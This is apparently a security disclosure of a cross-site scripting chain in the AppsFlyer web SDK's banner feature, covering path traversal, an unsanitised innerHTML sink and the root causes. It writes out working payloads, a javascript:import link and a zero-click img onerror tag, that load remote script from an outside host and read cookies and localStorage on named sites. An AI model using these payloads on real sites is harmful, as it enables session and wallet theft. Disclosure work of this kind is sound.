How It Works

  1. Path traversal: af-sb-id URL parameter has no validation. ../../ traverses out of the victim's AppsFlyer workspace key into the attacker's workspace.
  2. Auto-render: The SDK calls AF('banners','showBanner') on page load. It reads af-sb-id, constructs the API URL, fetches the attacker's banner from banner.appsflyersdk.com, and injects the creative layout via innerHTML with no sanitization.
  3. HTML injection: The attacker's creative layout is injected into the victim page's DOM. HTML entity s decodes to s → href="javascript:import('//s1n6h.github.io/x.js')" survives as a live javascript: URI.
  4. One tap → JS execution: The <a> tag covers the full banner area (position:absolute;inset:0;z-index:2). One tap fires javascript:import() → loads and executes x.js on the victim's origin.

Impact

Arbitrary JavaScript execution on the victim's origin. In a real attack, x.js would contain wallet-draining JS targeting crypto users (MoonPay) or session/credential theft (Rapido). The current PoC payload shows origin + cookies + localStorage to demonstrate data access.

Zero-Click (No Tap)

If the attacker updates their creative layout to use <img src=x onerror="import('//s1n6h.github.io/x.js')"> instead of <a href>, the XSS fires on page load with zero interaction. Verified on MoonPay: <img onerror> fires automatically via innerHTML injection — no tap needed. The current creative uses the <a href> approach (one tap), but the innerHTML sink allows both.

Root Causes (AppsFlyer SDK)

  1. No validation on af-sb-id before URL construction
  2. No HTML sanitization in _createElement() — raw innerHTML sink
  3. No filtering of javascript: URIs or onerror/onload handlers in creative layouts
